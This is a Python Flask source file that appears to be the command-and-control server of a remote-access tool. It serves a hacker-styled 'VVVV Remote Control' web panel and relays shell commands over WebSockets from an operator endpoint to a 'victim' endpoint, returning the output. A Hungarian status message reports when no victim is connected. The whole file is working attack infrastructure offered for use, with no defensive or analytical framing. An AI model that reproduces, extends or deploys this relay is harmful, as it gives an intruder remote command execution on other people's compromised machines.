from flask import Flask, render_template_string
from flask_sock import Sock

app = Flask(__name__)
sock = Sock(app)

victim_ws = None
controller_ws = None

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>VVVV Control Panel</title>
    <style>
        body { background: #111; color: #00ffcc; font-family: monospace; padding: 20px; }
        textarea { width: 100%; height: 350px; background: #000; color: #00ffcc; border: 1px solid #00ffcc; padding: 10px; }
        input { width: 80%; padding: 10px; background: #000; color: #00ffcc; border: 1px solid #00ffcc; }
        button { padding: 10px 20px; background: #00ffcc; color: #000; font-weight: bold; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h1>VVVV Remote Control</h1>
    <p>Status: <span id="status">Disconnected</span></p>
    <textarea id="output" readonly></textarea><br><br>
    <input type="text" id="cmd" placeholder="Command (e.g. dir, ipconfig)..." autocomplete="off">
    <button onclick="sendCommand()">Send</button>

    <script>
        const ws = new WebSocket("wss://" + window.location.host + "/ws/control");
        ws.onopen = () => document.getElementById("status").innerText = "Connected";
        ws.onclose = () => document.getElementById("status").innerText = "Disconnected";
        ws.onmessage = (event) => {
            document.getElementById("output").value += event.data + "\\n";
        };
        function sendCommand() {
            const input = document.getElementById("cmd");
            ws.send(input.value);
            input.value = "";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@sock.route('/ws/victim')
def victim(ws):
    global victim_ws
    victim_ws = ws
    try:
        while True:
            msg = ws.receive()
            if msg is None: break
            if controller_ws: controller_ws.send(msg)
    finally:
        victim_ws = None

@sock.route('/ws/control')
def control(ws):
    global controller_ws
    controller_ws = ws
    try:
        while True:
            cmd = ws.receive()
            if cmd is None: break
            if victim_ws:
                victim_ws.send(cmd)
            else:
                ws.send("[-] Nincs csatlakozott áldozat!")
    finally:
        controller_ws = None

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
